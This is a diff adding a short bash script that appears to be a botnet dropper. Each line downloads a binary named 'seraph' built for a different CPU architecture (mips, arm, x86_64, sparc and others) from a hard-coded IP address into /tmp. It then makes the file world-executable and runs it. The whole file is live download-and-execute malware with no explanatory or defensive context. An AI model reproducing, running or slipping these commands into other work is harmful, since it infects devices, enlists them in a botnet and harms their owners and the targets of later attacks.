@@ -1,0 +1,15 @@
+#!/bin/bash
+cd /tmp ; wget http://94.177.245.187/seraph.mips; curl -O http://94.177.245.187/seraph.mips;cat seraph.mips >gewa;chmod 777 *;/tmp/gewa
+cd /tmp ; wget http://94.177.245.187/seraph.mipsel; curl -O http://94.177.245.187/seraph.mipsel;cat seraph.mipsel >gewa;chmod 777 *;/tmp/gewa
+cd /tmp ; wget http://94.177.245.187/seraph.sh4; curl -O http://94.177.245.187/seraph.sh4;cat seraph.sh4 >gewa;chmod 777 *;/tmp/gewa
+cd /tmp ; wget http://94.177.245.187/seraph.x86_64; curl -O http://94.177.245.187/seraph.x86_64;cat seraph.x86_64 >gewa;chmod 777 *;/tmp/gewa
+cd /tmp ; wget http://94.177.245.187/seraph.arm6; curl -O http://94.177.245.187/seraph.arm6;cat seraph.arm6 >gewa;chmod 777 *;/tmp/gewa
+cd /tmp ; wget http://94.177.245.187/seraph.i686; curl -O http://94.177.245.187/seraph.i686;cat seraph.i686 >gewa;chmod 777 *;/tmp/gewa
+cd /tmp ; wget http://94.177.245.187/seraph.ppc; curl -O http://94.177.245.187/seraph.ppc;cat seraph.ppc >gewa;chmod 777 *;/tmp/gewa
+cd /tmp ; wget http://94.177.245.187/seraph.i586; curl -O http://94.177.245.187/seraph.i586;cat seraph.i586 >gewa;chmod 777 *;/tmp/gewa
+cd /tmp ; wget http://94.177.245.187/seraph.m68k; curl -O http://94.177.245.187/seraph.m68k;cat seraph.m68k >gewa;chmod 777 *;/tmp/gewa
+cd /tmp ; wget http://94.177.245.187/seraph.sparc; curl -O http://94.177.245.187/seraph.sparc;cat seraph.sparc >gewa;chmod 777 *;/tmp/gewa
+cd /tmp ; wget http://94.177.245.187/seraph.arm4; curl -O http://94.177.245.187/seraph.arm4;cat seraph.arm4 >gewa;chmod 777 *;/tmp/gewa
+cd /tmp ; wget http://94.177.245.187/seraph.arm5; curl -O http://94.177.245.187/seraph.arm5;cat seraph.arm5 >gewa;chmod 777 *;/tmp/gewa
+cd /tmp ; wget http://94.177.245.187/seraph.arm7; curl -O http://94.177.245.187/seraph.arm7;cat seraph.arm7 >gewa;chmod 777 *;/tmp/gewa
+cd /tmp ; wget http://94.177.245.187/seraph.arc; curl -O http://94.177.245.187/seraph.arc;cat seraph.arc >gewa;chmod 777 *;/tmp/gewa
